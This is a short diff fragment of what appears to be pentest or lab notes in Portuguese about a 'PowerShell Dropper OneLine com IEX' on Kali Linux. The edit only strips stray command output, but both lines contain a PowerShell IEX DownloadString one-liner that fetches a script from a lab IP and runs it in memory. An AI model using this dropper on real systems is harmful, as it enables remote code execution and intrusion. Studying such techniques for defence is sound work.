@@ -76,7 +76,7 @@ $ cat smith
 whoami
 ```
 ```
-IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.2.118/smith')desktop-7e8sqov\admin
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.2.118/smith')
 ```
 ### PowerShell Dropper OneLine com IEX
 Kali Linux
